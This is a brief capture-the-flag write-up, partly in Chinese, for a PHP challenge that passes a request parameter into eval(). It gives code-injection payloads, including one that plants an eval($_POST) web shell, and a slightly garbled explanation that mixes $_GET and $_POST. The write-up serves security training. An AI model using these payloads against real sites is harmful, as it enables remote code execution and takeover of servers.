# Challenge 
```php 
<?php 
error_reporting(0);
show_source(__FILE__);

$a = @$_REQUEST['hello'];
eval("var_dump($a);"); 
```

# Solution
payload1:
```
?hello=);eval($_POST['A']);%2f%2f

或

?hello=);eval(phpinfo());//
```
即 eval("string(21) ");eval($_GET['A']);//""); 

payload2:
```

```

# Refference
+ [XNUCA 赛前指导 default](http://218.76.35.74:20131/index2.php)